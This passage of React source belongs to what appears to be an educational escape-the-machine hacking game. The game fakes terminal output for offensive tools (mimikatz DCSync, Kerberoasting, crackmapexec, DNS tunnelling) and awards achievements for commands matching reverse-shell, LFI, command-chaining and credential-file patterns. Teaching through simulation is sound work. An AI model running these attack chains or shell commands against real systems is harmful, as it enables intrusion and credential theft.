    newCwd: cwd
  };
  if (cmd === "ufw") {
    if (args[0] === "status") return {
  ...
  if (cmd === "iptables-save") return {
    output: "# iptables saved to /etc/iptables/rules.v4",
    newCwd: cwd
  };
  if (cmd === "fail2ban-client") return {
    output: "Status for jail ssh:\n  currently banned: 3\n  total banned: 847\n  banned IPs: 185.220.101.47 185.220.101.32 104.244.73.12",
    newCwd: cwd
  };
  if (cmd === "auditctl") return {
    output: args.length ? "(audit rule added — file/call now being monitored)" : "Usage: auditctl -w <file> -p <perms> -k <key>",
    newCwd: cwd
  };
  if (cmd === "ausearch") return {
    output: "type=SYSCALL msg=audit(1700018951): arch=c000003e syscall=87\nuid=1000 gid=1000 euid=0 comm='python3'\nkey='passwd_changes'\n(File /etc/passwd was accessed by python3 running as root!)",
    newCwd: cwd
  };
  if (cmd === "osqueryi") return {
    output: "osquery> SELECT name,pid,cmdline FROM processes WHERE name LIKE '%python%';\nname    | pid  | cmdline\npython3 | 4471 | python3 -c import socket...\n\nosquery> SELECT * FROM listening_ports;\nport | address   | protocol\n22   | 0.0.0.0   | 6\n80   | 0.0.0.0   | 6\n3306 | 127.0.0.1 | 6",
    newCwd: cwd
  };
  if (cmd === "ldapsearch") return {
    output: `# LDAPv3 search result\n# numResponses: 848\n\ndn: DC=corp,DC=axiom,DC=local\nobjectClass: domain\nms-DS-MachineAccountQuota: 10\n\ndn: CN=stranger,OU=Users,DC=corp\nobjectClass: user\nsAMAccountName: stranger\nmemberOf: CN=Domain Users\n\n[*] 847 user objects found\n[*] 200 computer objects found\n[*] 15 domain admin accounts`,
    newCwd: cwd
  };
  if (cmd === "crackmapexec" || cmd === "cme") return {
    output: `SMB  10.0.0.100  445  AXIOM-DC  [*] Windows Server 2019 x64 (name:AXIOM-DC) (domain:corp.axiom.local)\nSMB  10.0.0.100  445  AXIOM-DC  [+] corp.axiom.local\\svc_backup:BackupPass2023! (Pwn3d!)\nSMB  10.0.0.20   445  AXIOM-SRV [*] Windows Server 2016 x64\nSMB  10.0.0.20   445  AXIOM-SRV [-] corp.axiom.local\\svc_backup:BackupPass2023! LOGON_FAILURE`,
    newCwd: cwd
  };
  if (cmd === "GetUserSPNs.py" || cmd.toLowerCase().includes("getuserspns")) return {
    output: `Impacket GetUserSPNs.py\n\nServicePrincipalName    Name        MemberOf                Password  Last Set\naxiom/svc_backup.local  svc_backup  CN=Domain Admins         <never>\naxiom/svc_report.local  svc_report  CN=Reporting              2023-01-01\n\n$krb5tgs$23$*svc_backup$CORP.AXIOM.LOCAL$axiom/svc_backup.local*$a7c8d9...\n\n[*] Kerberoastable ticket extracted — crack with hashcat -m 13100`,
    newCwd: cwd
  };
  if (cmd === "GetNPUsers.py" || cmd.toLowerCase().includes("getnpusers")) return {
    output: `Impacket GetNPUsers.py\n\nName        MemberOf              UAC  Description\nsvc_monitor CN=Domain Users        DONT_REQ_PREAUTH\n\n$krb5asrep$23$svc_monitor@CORP.AXIOM.LOCAL:...\n\n[*] AS-REP Roasting ticket — crack offline`,
    newCwd: cwd
  };
  if (cmd === "mimikatz") return {
    output: `  .#####.   mimikatz 2.2.0\n .## ^ ##.  'A La Vie, A L'Amour'\n ## / \\ ##  Benjamin DELPY\n\nPRIVILEGE::Debug: OK\n\nlsadump::dcsync /all:\n  Hash NTLM: aad3b435b51404ee... (KRBTGT)\n  Hash NTLM: 31d6cfe0d16ae931... (Administrator)\n  Hash NTLM: 58a478135a93ac3b... (svc_backup)\n\n[!] All domain hashes extracted via DCSync\n[!] Create Golden Ticket with KRBTGT hash`,
    newCwd: cwd
  };
  if (cmd === "winpeas" || cmd === "winpeas.exe") return {
    output: `WINPEAS — Windows Privilege Escalation\n\n[!] AlwaysInstallElevated: ENABLED\n[!] AutoLogon: DefaultPassword=CorpPass2024!\n[!] Unquoted service path: C:\\Program Files (x86)\\Axiom\\service.exe\n[*] PowerShell history: mysql -u root -pAxiom2021!\n[!] Potato attack possible (SeImpersonatePrivilege)`,
    newCwd: cwd
  };
  if (cmd === "smbclient") {
    if (args.includes("-L")) return {
      output: `Sharename  Type  Comment\n---------  ----  -------\nADMIN$     Disk  Remote Admin\nC$         Disk  Default share\nIPC$       IPC   Remote IPC\nPublic     Disk  Public Share (NO PASSWORD!)\n\n[!] Public share accessible anonymously`,
      newCwd: cwd
    };
    return {
      output: `smb: \\> ls\n  .           D\n  ..          D\n  readme.txt  A  128\n  IT_Backups  D  0\nsmb: \\> cd IT_Backups\nsmb: \\IT_Backups\\> ls\n  password_list_2019.txt  A  47328  ← credentials file\n  server_config.tar.gz    A  184729`,
      newCwd: cwd
    };
  }
  if (cmd === "enum4linux") return {
    output: `enum4linux 0.9.1\n\nShare Enumeration:\n  Public   (DISK)  — no password!\n\nPassword Policy:\n  Minimum length: 7\n  History: 24 passwords\n\nUsers:\n  admin (RID 500)\n  jrichardson (RID 1001)\n  svc_backup (RID 1002)`,
    newCwd: cwd
  };
  if (cmd === "snmpwalk") return {
    output: `iso.3.6.1.2.1.1.1.0 = STRING: "Linux axiom-server 5.4.0-182"\niso.3.6.1.2.1.1.5.0 = STRING: "axiom-server"\niso.3.6.1.2.1.25.1.1.0 = Timeticks: 73243100 (8 days)\niso.3.6.1.2.1.4.20.1.1.10.0.0.10 = IpAddress: 10.0.0.10\n[847 more entries...]`,
    newCwd: cwd
  };
  if (cmd === "ftp") return {
    output: args[0] ? `Connected to ${args[0]}.\n220 FTP Server ready.\nName: anonymous\nPassword:\n230 Anonymous login OK.\nftp> ls\n-rw-r--r-- 1 ftp ftp 1247 server_backup_config.tar.gz\n-rw-r--r-- 1 ftp ftp 384  readme.txt\n[!] Anonymous FTP login successful` : "Usage: ftp <host>",
    newCwd: cwd
  };
  if (cmd === "ssh") return {
    output: args.length ? `ssh: connect to host ${args.find(a => a.includes("@") || a.match(/\d+\.\d+/)) || "?"} port 22: Connection timed out\n(Direct SSH from this machine is blocked — use SOCKS proxy: ssh -D 1080 user@pivot)` : "Usage: ssh [user@]host",
    newCwd: cwd
  };
  if (cmd === "iodine") return {
    output: args.length ? "[*] Connecting to DNS tunnel\n[*] Interface created: ip0\n[*] Tunnel established via port 53/UDP\n[*] You can now route traffic through the DNS tunnel\n[!] AXIOM firewall cannot detect this — DNS traffic looks normal" : "Usage: iodine -f -P <pass> <ns> <domain>",
    newCwd: cwd
  };
  if (cmd === "proxychains") return {
    output: `ProxyChains-4.x — running: ${args.join(" ")}\n[proxychains] Dynamic chain: 127.0.0.1:1080 → ${args.find(a => a.match(/\d+\.\d+/)) || "target"}\n(traffic routed through SOCKS proxy on pivot machine)`,
    newCwd: cwd
  };
  if (cmd === "arp-scan") return {
    output: "Interface: eth0\n10.0.0.1  aa:bb:cc:dd:ee:01  Generic Router\n10.0.0.10 08:00:27:12:34:56  Oracle VirtualBox\n10.0.0.20 08:00:27:ab:cd:ef  Oracle VirtualBox\n10.0.0.100 08:00:27:ff:00:01 Oracle VirtualBox\n4 packets received, 0 dropped",
    newCwd: cwd
  };
  if (cmd === "theHarvester" || cmd === "theharvester") return {
    output: `theHarvester 4.4.3\n\n[*] Searching in Google\n\nEmails found:\n  admin@axiom-systems.com\n  jrichardson@axiom-systems.com\n  helpdesk@axiom-systems.com\n\nHosts found:\n  www.axiom-systems.com: 10.0.0.10\n  mail.axiom-systems.com: 10.0.0.15\n  vpn.axiom-systems.com: 10.0.0.20`,
    newCwd: cwd
  };
  if (cmd === "python3" || cmd === "python") {
    if (args.includes("-c") && args[1]) {
      if (args[1].includes("print('alive')") || args[1].includes("print(\"alive\")")) return {
        output: "alive",
        newCwd: cwd
      };
      if (args[1].includes("socket")) return {
        output: "axiom-kali",
        newCwd: cwd
      };
      if (args[1].includes("pty") && args[1].includes("spawn")) return {
        output: "root@axiom-kali:/# (stabilised shell — fully interactive TTY)",
        newCwd: cwd
      };
      if (args[1].includes("os")) return {
        output: "uid=0(root) gid=0(root) groups=0(root)",
        newCwd: cwd
      };
      return {
        output: "(python3 -c: executed)",
        newCwd: cwd
      };
    }
    return {
  ...
  if (input.includes("<script>") || input.includes("document.cookie") || input.includes("alert(")) {
    ...
    return {
      output: `[XSS Test]\nPayload: ${input}\nResult: ${stored ? "[STORED XSS] Payload saved to database — executes for every user who views this page" : "[REFLECTED XSS] Payload reflected in response — executes in your browser"}\n\n${input.includes("document.cookie") ? "[!] Cookie theft payload — would exfiltrate session cookies to attacker server" : "[!] XSS confirmed — JavaScript execution in browser context"}`,
      newCwd: cwd
    };
  }
  if (cmd === "help" || cmd === "man" || cmd === "--help") {
    return {
      output: `TERMINAL REFERENCE — axiom-kali
═══════════════════════════════════════════
...
↑↓  Navigate command history`,
  ...
  if (cmd === "exit" || cmd === "logout" || cmd === "quit") return {
    output: "logout: cannot exit — find the escape route in /sys/firewall/",
    newCwd: cwd
  };
  if (cmd === "ls" || cmd === "dir") return {
    output: "Desktop  Documents  workspace",
    newCwd: cwd
  };
  return {
...
╚══██╔══╝██║  ██║██╔════╝    ██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝
  ...
  }, "You woke up inside a machine called AXIOM-KALI.", React.createElement("br", null), "You had nothing but a black screen and a blinking cursor.", React.createElement("br", null), "You couldn't even read a file when you started.", React.createElement("br", null), React.createElement("br", null), "You followed V's trail. You learned to see, to move, to read what was hidden.", React.createElement("br", null), "You decoded the first piece. You dug the second out of a lie. You became root", React.createElement("br", null), "and took the third. You assembled the key \u2014 and you walked out the door."), React.createElement("div", {
    style: {
      marginTop: 22,
      color: "#1a6b1a",
  ...
  }, unlockedCount), " of ", totalCount, " hidden achievements found \xA0\xB7\xA0 ", React.createElement("span", {
    style: {
      color: C
    }
  }, xp), " XP", React.createElement("br", null), React.createElement("br", null), "The tunnel collapsed behind you. AXIOM never saw the door.", React.createElement("br", null), "On the far side of the firewall, a second signature was already waiting.", React.createElement("br", null), React.createElement("br", null), React.createElement("span", {
    style: {
      color: C
    }
  }, "\"You made it. I knew you would. \u2014 V\""), React.createElement("br", null), React.createElement("br", null), "You're out. And now you know how."), React.createElement("button", {
    onClick: onReset,
    style: {
      marginTop: 24,
...
function GameOverScreen({
  ...
  return React.createElement("div", {
    style: {
      ...
      alignItems: "center",
      justifyContent: "center",
      background: "radial-gradient(120% 90% at 50% 30%, #1a0303 0%, #0a0000 72%)",
      color: "#ff3b3b",
      fontFamily: "'Courier New',monospace",
      textAlign: "center",
      padding: 24,
      textShadow: "0 0 18px #ff0000"
    }
  }, React.createElement("div", {
    style: {
  ...
  }, "You ran ", React.createElement("b", null, "rm -rf /"), " on the machine you were trapped inside.", React.createElement("br", null), "You deleted the floor under your own feet. There is nothing left to escape from.", React.createElement("br", null), React.createElement("br", null), "Your save is gone. Hit the button to wake up in a fresh machine and try again."), React.createElement("button", {
    onClick: onReset,
    style: {
      marginTop: 28,
      background: "transparent",
...
const ACHIEVEMENTS = [{
  ...
  fn: c => /^ls(\s|$)/.test(c) && /(^|\s)-(a|la|al|al|al)\b|-[a-z]*a/.test(c) && c.includes("-") && c.includes("a")
}, {
  key: "a_cat",
  cat: "ORIENTATION",
  name: "Reader",
  ...
  fn: (c, o, s) => s && (s.cwd === "/" || s.cwd && s.cwd.split("/").filter(Boolean).length >= 3)
}, {
  key: "v_voice",
  cat: "V'S TRAIL",
  name: "V Speaks",
  fn: c => /^cat\s/.test(c) && c.includes("from_V")
}, {
  key: "v_follow",
  cat: "V'S TRAIL",
  name: "Following the Trail",
  fn: c => /^cat\s/.test(c) && /\.v1(\s|$)/.test(c)
}, {
  key: "v_plan",
  cat: "V'S TRAIL",
  name: "The Plan",
  fn: c => /^cat\s/.test(c) && /\.v2(\s|$)/.test(c)
}, {
  key: "v_pipe",
  cat: "V'S TRAIL",
  name: "Plumber",
  ...
  fn: c => c.includes("base64") && (c.includes("-d") || c.includes("--decode"))
}, {
  key: "v_p1",
  cat: "V'S TRAIL",
  name: "Piece One",
  fn: (c, o) => o && o.includes("FR1:vel")
}, {
  key: "v_strings",
  cat: "V'S TRAIL",
  name: "Look Inside the Lie",
  fn: c => /(^|\s)strings\s/.test(c)
}, {
  key: "v_p2",
  cat: "V'S TRAIL",
  name: "Piece Two",
  fn: (c, o) => o && o.includes("FRAG2:vet")
}, {
  key: "v_leak",
  cat: "V'S TRAIL",
  name: "The Password Was Right There",
  fn: (c, o) => o && o.includes(ROOT_PW_STR)
}, {
  key: "v_root",
  cat: "V'S TRAIL",
  name: "Crown",
  fn: (c, o, s) => s && s.user === "root"
}, {
  key: "v_p3",
  cat: "V'S TRAIL",
  name: "Piece Three",
  fn: (c, o) => o && o.includes("FR3:_out")
}, {
  key: "v_final",
  cat: "V'S TRAIL",
  name: "V's Last Word",
  fn: c => /^cat\s/.test(c) && c.includes(".v_final")
}, {
  key: "s_grep",
  cat: "SHELL CRAFT",
  name: "Grep Master",
  fn: c => /^grep\s/.test(c) || c.includes("| grep") || c.includes("|grep")
}, {
  key: "s_find",
  cat: "SHELL CRAFT",
  name: "Seek and Find",
  ...
  cat: "SHELL CRAFT",
  name: "Scribe",
  fn: c => c.includes("echo") && c.includes(">")
}, {
  key: "s_rm",
  cat: "SHELL CRAFT",
  name: "Destroyer",
  fn: c => /^rm\s/.test(c) && !c.includes(" /")
}, {
  key: "r_ping",
  cat: "RECON",
  name: "Knock Knock",
  ...
  cat: "RECON",
  name: "Port Knocker",
  fn: c => c.includes("nmap")
}, {
  key: "r_deep",
  cat: "RECON",
  name: "Deep Scan",
  fn: c => c.includes("nmap") && (c.includes("-sv") || _lc(c).includes("-sv") || c.includes("-A") || c.includes("-sC") || _lc(c).includes("-sc"))
}, {
  key: "r_dns",
  cat: "RECON",
  name: "DNS Digger",
  fn: c => /^dig\s/.test(c) || /^nslookup\b/.test(c) || /^host\s/.test(c) || c.includes("dnsenum") || c.includes("dnsrecon")
}, {
  key: "r_web",
  cat: "RECON",
  name: "Web Walker",
  fn: c => /^curl\s/.test(c) || /^wget\s/.test(c)
}, {
  key: "r_sniff",
  cat: "RECON",
  name: "Traffic Watcher",
  fn: c => c.includes("tcpdump") || c.includes("wireshark") || c.includes("tshark")
}, {
  key: "w_sqli",
  cat: "WEB ATTACKS",
  name: "Injector",
  fn: (c, o) => c.includes("sqlmap") || o && o.includes("SQL INJECTION")
}, {
  key: "w_xss",
  cat: "WEB ATTACKS",
  name: "Cross-Site",
  fn: (c, o) => _lc(c).includes("<script>") || o && (o.includes("XSS") || o.includes("REFLECTED") || o.includes("STORED"))
}, {
  key: "w_lfi",
  cat: "WEB ATTACKS",
  name: "Traversal",
  fn: (c, o) => c.includes("../") && _lc(c).includes("etc/passwd") || o && o.includes("LFI")
}, {
  key: "w_ci",
  cat: "WEB ATTACKS",
  name: "Command Chain",
  fn: c => c.includes("; id") || c.includes(";id")
}, {
  key: "e_msf",
  cat: "EXPLOITATION",
  name: "The Framework",
  fn: c => c.includes("msfconsole")
}, {
  key: "e_venom",
  cat: "EXPLOITATION",
  name: "Payload Smith",
  fn: c => c.includes("msfvenom")
}, {
  key: "e_shell",
  cat: "EXPLOITATION",
  name: "Shell Caller",
  fn: (c, o) => c.includes("nc ") && (c.includes("-e") || c.includes("-lvnp") || c.includes("4444")) || c.includes("bash -i") || o && (o.includes("Meterpreter session") || o.includes("reverse shell") || o.includes("session opened"))
}, {
  key: "p_sudo",
  cat: "PRIVILEGE ESCALATION",
  name: "Sudo Sleuth",
  fn: c => c.includes("sudo -l")
}, {
  key: "p_suid",
  cat: "PRIVILEGE ESCALATION",
  name: "SUID Hunter",
  fn: c => c.includes("find") && c.includes("-perm") && (c.includes("4000") || c.includes("u=s") || c.includes("u+s"))
}, {
  key: "p_crack",
  cat: "PRIVILEGE ESCALATION",
  name: "Hashcracker",
  fn: c => c.includes("hashcat") || /^john\b/.test(c) || c.includes(" john ")
}, {
  key: "p_shadow",
  cat: "PRIVILEGE ESCALATION",
  name: "Credential Harvest",
  fn: c => /^cat\s/.test(c) && (c.includes("shadow") || c.includes("config.php") || c.includes(".vault"))
}, {
  key: "n_arp",
  cat: "NETWORK ATTACKS",
  name: "The Spoofer",
  fn: c => c.includes("arpspoof") || c.includes("ettercap") || c.includes("bettercap")
}, {
  key: "n_wifi",
  cat: "NETWORK ATTACKS",
  name: "Deauth",
  fn: c => c.includes("aireplay") || c.includes("airodump") || c.includes("aircrack") || c.includes("airmon")
}, {
  key: "n_poison",
  cat: "NETWORK ATTACKS",
  name: "Poisoner",
  fn: c => c.includes("responder") || c.includes("dnsspoof") || c.includes("dns") && c.includes("spoof")
}, {
  key: "f_log",
  cat: "FORENSICS & DEFENSE",
  name: "Log Detective",
  fn: c => c.includes("/var/log") && (/^cat\s/.test(c) || /^tail\b/.test(c) || /^less\b/.test(c) || /^grep\s/.test(c) || c.includes("cat "))
}, {
  key: "f_ipt",
  cat: "FORENSICS & DEFENSE",
  name: "Hardened",
  fn: c => c.includes("iptables")
}, {
  key: "f_hunt",
  cat: "FORENSICS & DEFENSE",
  name: "Threat Hunter",
  fn: c => c.includes("ausearch") || c.includes("grep") && c.includes("log")
}, {
  key: "d_kerb",
  cat: "ACTIVE DIRECTORY",
  name: "Kerberoast",
  fn: c => _lc(c).includes("kerberoast") || _lc(c).includes("getuserspn")
}, {
  key: "d_dcs",
  cat: "ACTIVE DIRECTORY",
  name: "DCSync",
  fn: c => _lc(c).includes("dcsync") || c.includes("secretsdump")
}, {
  key: "d_gold",
  cat: "ACTIVE DIRECTORY",
  name: "Golden Ticket",
  fn: c => _lc(c).includes("golden") || c.includes("ticketer") || _lc(c).includes("mimikatz")
}, {
  key: "x_curious",
  cat: "SECRET",
  name: "Curiosity",
  fn: c => c.includes(".vault_v")
}, {
  key: "x_man",
  cat: "SECRET",
  name: "RTFM",
  fn: c => /^man\s/.test(c) || /^help$/.test(c)
}, {
  key: "x_history",
  cat: "SECRET",
  name: "Ghosts of Commands Past",
  fn: c => /^history$/.test(c) || c.includes("bash_history")
}];
...
function MainMenu({
  ...
  function onKey(e) {
    if (e.key === "Enter") {
      hasProgress && !confirmNew ? onContinue() : !hasProgress ? onNew() : null;
    }
  }
  const btn = (label, sub, onClick, primary) => React.createElement("button", {
    className: "km-btn",
    onClick: onClick,
    style: {
      width: "100%",
      textAlign: "left",
      cursor: "pointer",
      background: primary ? "#001b00" : "transparent",
      border: `1px solid ${primary ? C : "#1c4d1c"}`,
      color: primary ? C : "#5fae5f",
      fontFamily: "'Courier New',monospace",
      padding: "13px 16px",
      letterSpacing: 2,
      display: "flex",
  ...
  return React.createElement("div", {
    ...
    style: {
      ...
      color: C,
      lineHeight: 1,
      textShadow: `0 0 18px ${C}, 0 0 40px rgba(0,255,65,0.5)`
    }
  }, "KALI"), React.createElement("div", {
    className: "km-title",
    style: {
      fontSize: 46,
      fontWeight: "bold",
  ...
  }, "PRISON"), React.createElement("div", {
    style: {
      marginTop: 14,
      marginBottom: 26,
      fontSize: 11,
  ...
  }, "T R A P P E D\xA0\xA0I N\xA0\xA0A X I O M - K A L I"), React.createElement("div", {
    style: {
      width: "100%",
      display: "flex",
      flexDirection: "column",
  ...
  }, hasProgress && !confirmNew && btn(escaped ? "▶  CONTINUE (you escaped)" : "▶  CONTINUE", `${unlockedCount}/${ACH_TOTAL} achievements · ${xp} XP`, onContinue, true), !confirmNew && btn(hasProgress ? "＋  NEW GAME" : "▶  ENTER THE MACHINE", hasProgress ? "wipes current progress" : "you wake up trapped. find the way out.", () => hasProgress ? setConfirmNew(true) : onNew(), !hasProgress), confirmNew && React.createElement("div", {
    style: {
  ...
  }, "Wipe your save and wake up fresh?"), React.createElement("div", {
    style: {
      display: "flex",
      gap: 10
    }
  ...
  }, "YES, WIPE"), React.createElement("button", {
    className: "km-btn",
  ...
  }, "ONE TERMINAL \xB7 NO MAP \xB7 ", ACH_TOTAL, " HIDDEN ACHIEVEMENTS"), React.createElement("div", {
    style: {
      marginTop: 7,
      fontSize: 9,
      letterSpacing: 1,
  ...
  }, "github.com/the-priest/kaliprison")), React.createElement("style", null, `
...
function TrophyCase({
  ...
  return React.createElement("div", {
  ...
  }, count, " / ", ACH_TOTAL, " found \u2014 the rest are hidden. Do the thing to reveal it."), ACH_CATS.map(group => React.createElement("div", {
    key: group.cat,
    style: {
      marginBottom: 16
    }
    ...
    style: {
      ...
      letterSpacing: 3,
      marginBottom: 7,
      borderBottom: "1px solid #142a14",
      paddingBottom: 4
    }
  }, group.cat), group.items.map(a => {
...
function App() {
  ...
  function advanceIntro(e) {
    ...
    if (introPage < INTRO_PAGES.length - 1) setIntroPage(p => p + 1);else startGame();
  }
  ...
  function submit() {
    ...
    if (!pendingBefore && (t === "trophies" || t === "achievements")) {
      setHistory(h => [...h, {
        type: "cmd",
        cmd: raw,
        output: "(opening your achievement case…)",
        cwd: s.cwd,
        user: promptUser
      }]);
    ...
    if (res.reboot) {
      setHistory(h => [...h, {
        ...
        type: "out",
        text: "Broadcast message: The system is going down for reboot NOW!"
      }]);
      setTimeout(() => {
        fsRef.current = makeWorld();
        sessRef.current = newSession();
    ...
    if (res.escape) {
      const escLines = [{
        ...
        type: "out",
        text: "[*] Key accepted. Firewall recognised V's signature."
      }, {
        type: "out",
        text: "[*] Opening DNS tunnel on 53/udp — the one egress AXIOM left open..."
      }, {
        type: "out",
        text: "[*] Encoding session and pushing it through the firewall..."
      }, {
        type: "out",
        text: "[*] Reusing V's external endpoint... handshake returned."
      }, {
        type: "out",
  ...
  if (gameOver) return React.createElement(GameOverScreen, {
    onReset: resetGame
  });
  if (escaped && screen === "game") return React.createElement(EscapeScreen, {
    xp: xp,
    unlockedCount: unlockedRef.current.size,
    totalCount: ACH_TOTAL,
    onReset: resetGame
  });
  if (screen === "menu") {
  ...
  if (screen === "intro") {
    ...
    }, INTRO_PAGES.map((_, i) => React.createElement("div", {
      key: i,
      style: {
        width: 8,
        height: 8,
        borderRadius: "50%",
        background: i === introPage ? "#00ff41" : "#1a3a1a",
        transition: "all 0.3s"
      }
    }))), React.createElement("div", {
      style: {
    ...
    }, page.text), page.sub ? React.createElement("div", {
      style: {
        color: "#1f5c1f",
        fontSize: 12,
        letterSpacing: 4,
    ...
    }, page.sub) : React.createElement("div", {
      style: {
        color: "#1a4d1a",
        fontSize: 11,
        letterSpacing: 3
      }
    }, "CLICK OR PRESS ENTER \u2192")), React.createElement("style", null, `@keyframes blink{50%{opacity:0}}`));
  }
  const G = {
    bg: "#080c08",
    panel: "#0a0f0a",
  ...
  return React.createElement("div", {
  ...
  }, "AXIOM-KALI"), React.createElement("span", {
    style: {
      color: G.dim
    }
  }, "|"), React.createElement("span", {
    style: {
      color: sessRef.current?.user === "root" ? "#ff6b6b" : G.mid,
      fontSize: 11
    }
  }, sessRef.current?.user === "root" ? "● root" : "● stranger"), React.createElement("div", {
    style: {
      flex: 1
    }
  }), React.createElement("button", {
    onClick: () => setShowTrophies(true),
    title: "Achievements you've discovered",
    style: {
      background: "transparent",
  ...
  }, "\u2726 ", unlockedCount, "/", ACH_TOTAL), React.createElement("span", {
    style: {
      color: G.dim,
      fontSize: 10
    }
  }, "XP ", xp), React.createElement("span", {
    style: {
      color: G.dim
    }
  }, "|"), React.createElement("button", {
    onClick: toMenu,
    title: "Main menu (progress saves automatically)",
    style: {
      background: "transparent",
      border: `1px solid ${G.border}`,
      color: G.mid,
    ...
    if (e.type === "sys") return React.createElement("div", {
      key: i,
      style: {
        color: G.mid,
        whiteSpace: "pre-wrap",
    ...
    if (e.type === "out") return React.createElement("div", {
      key: i,
      style: {
        color: G.text,
        whiteSpace: "pre-wrap",
    ...
    }, (e.cwd || "/home/stranger").replace("/home/stranger", "~")), React.createElement("span", {
      style: {
        color: e.user === "root" ? "#ff6b6b" : "#2a8a2a"
      }
    }, e.user === "root" ? " # " : " $ "), e.cmd), e.output && React.createElement("div", {
      style: {
        color: G.text,
        whiteSpace: "pre-wrap",
        paddingLeft: 2,
  ...
  }, masked ? React.createElement("span", {
    style: {
      color: G.mid,
      flexShrink: 0
    }
  }, "Password:\xA0") : React.createElement(React.Fragment, null, React.createElement("span", {
    style: {
      color: G.dim,
      flexShrink: 0
    }
  }, cwd.replace("/home/stranger", "~")), React.createElement("span", {
    style: {
      color: sessRef.current?.user === "root" ? "#ff6b6b" : "#2a8a2a",
      flexShrink: 0
    }
  }, sessRef.current?.user === "root" ? " # " : " $ ")), React.createElement("input", {
    ref: inputRef,
    value: input,
    ...
    style: {
      ...
      padding: "9px 14px",
      minWidth: 230,
      boxShadow: "0 0 22px rgba(0,255,65,0.25)",
  ...
  }, t.name)))), showTrophies && React.createElement(TrophyCase, {
